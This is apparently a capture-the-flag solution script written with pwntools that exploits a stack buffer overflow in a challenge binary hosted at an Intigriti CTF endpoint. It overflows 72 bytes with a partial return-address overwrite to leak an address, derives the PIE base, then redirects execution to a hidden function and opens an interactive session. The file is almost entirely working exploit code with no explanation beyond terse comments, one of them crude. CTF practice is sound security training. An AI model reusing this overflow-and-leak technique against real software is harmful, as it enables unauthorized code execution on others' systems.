from pwn import *

gs = '''
break *input+114
continue
'''

elf = context.binary = ELF("./chall")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

offset = 72

payload = b"".join([
    b"A"*offset,
    b"\x1a"
])

io.sendafter(":", payload) # Mucho cuidado aqui sendafter != sendafterline

io.recvuntil(b"A"*offset)

received_bytes = io.recv(6)
#leak_address = int.from_bytes(received_bytes, byteorder='little') - 68
leak_address = int.from_bytes(received_bytes, byteorder='little')
print(f"Leak mich im arsch: 0x{leak_address:016x}")

elf.address = leak_address - elf.symbols["main"]
print(f"Leak mich im arsch _ function: 0x{elf.symbols['_']}")

payload = b"".join([
    b"A"*offset,
    p64(elf.symbols['_'])
])

io.sendafter(":", payload)

io.interactive()


